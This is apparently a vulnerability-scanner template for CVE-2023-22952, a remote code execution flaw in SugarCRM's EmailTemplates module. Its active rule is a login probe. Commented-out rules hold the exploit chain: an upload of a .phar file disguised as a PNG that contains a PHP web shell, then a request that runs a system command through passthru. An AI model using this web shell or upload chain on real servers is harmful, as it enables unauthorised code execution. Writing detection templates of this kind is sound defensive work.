id: CVE-2023-22952

info:
  name: SugarCRM EmailTemplates RCE
  author: zan8in
  severity: critical
  verified: false
  description: |
    In SugarCRM before 12.0. Hotfix 91155, a crafted request can inject custom PHP code through the EmailTemplates because of missing input validation.
    body="< a href= " javascript:void window.open('http://support.sugarcrm.com')\\">Support</ a>" || body="< img style='margin-top: 2px' border='0' width='106' height='23' src='include/images/poweredby_sugarcrm.png' alt='Powered By SugarCRM'>" || body="<script>var module_sugar_grp1 = 'Users';</script><script>var action_sugar_grp1 = 'Login';</script><script>jscal_today" || header="index.php?action=Login&module=Users" || title="SugarCRM" || body="var parentIsSugar = false;" || body="<div id=\\"sugarcrm\\">" || header="Set-Cookie: sugar_user_theme=Sugar5"
  reference:
    - https://attackerkb.com/topics/E486ui94II/cve-2023-22952

set:
  hostname: request.url.host
  randstr: randomLowercase(12)
rules:
  r0:
    request:
      raw: |
        POST /index.php HTTP/1.1
        Host: {{hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15
        Cookie: PHPSESSID=c09b717d-9ff8-42ec-a2fb-1ad3edfab4c5
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 72
        Connection: close

        module=Users&action=Authenticate&user_name=brenda&user_password=DbLiL98a
  # r0:
  #   request:
  #     method: POST
  #     path: /index.php
  #     headers:
  #       Cookie: PHPSESSID=c09b717d-9ff8-42ec-a2fb-1ad3edfab4c5
  #     body: module=Users&action=Authenticate&user_name=brenda&user_password=DbLiL98a
    expression: response.status == 500 && response.body.ibcontains(b'You must specify a valid username and password')
  # r1:
  #   request:
  #     method: POST
  #     path: /index.php
  #     headers:
  #       Cookie: PHPSESSID=c09b717d-9ff8-42ec-a2fb-1ad3edfab4c5
  #       Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryWeTJtA8WByYIQMGR
  #     body: "\
  #       ------WebKitFormBoundaryWeTJtA8WByYIQMGR\r\n\
  #       Content-Disposition: form-data; name=\"action\"\r\n\
  #       \r\n\
  #       AttachFiles\r\n\
  #       ------WebKitFormBoundaryWeTJtA8WByYIQMGR\r\n\
  #       Content-Disposition: form-data; name=\"module\"\r\n\
  #       \r\n\
  #       EmailTemplates\r\n\
  #       ------WebKitFormBoundaryWeTJtA8WByYIQMGR\r\n\
  #       Content-Disposition: form-data; name=\"file\"; filename=\"{{randstr}}.phar\"\r\n\
  #       Content-Type: image/png\r\n\
  #       \r\n\
  #       PNG\r\n\
  #       \r\n\
  #       --Garbled binary text--<?=$_GET[0](base64_decode($_POST[1]));?>--Garbled binary text--\r\n\
  #       ------WebKitFormBoundaryWeTJtA8WByYIQMGR--\r\n\
  #       "
  #   expression: true
  # r2:
  #   request:
  #     method: POST
  #     path: /cache/images/{{randstr}}.phar?0=passthru
  #     headers:
  #       Cookie: PHPSESSID=06457e85-5a6c-4428-880a-8e5134137650
  #     body: 1=bHMgLWwK
  #   expression: response.status == 200 && response.body.bcontains(bytes(randstr))
expressions: r0()
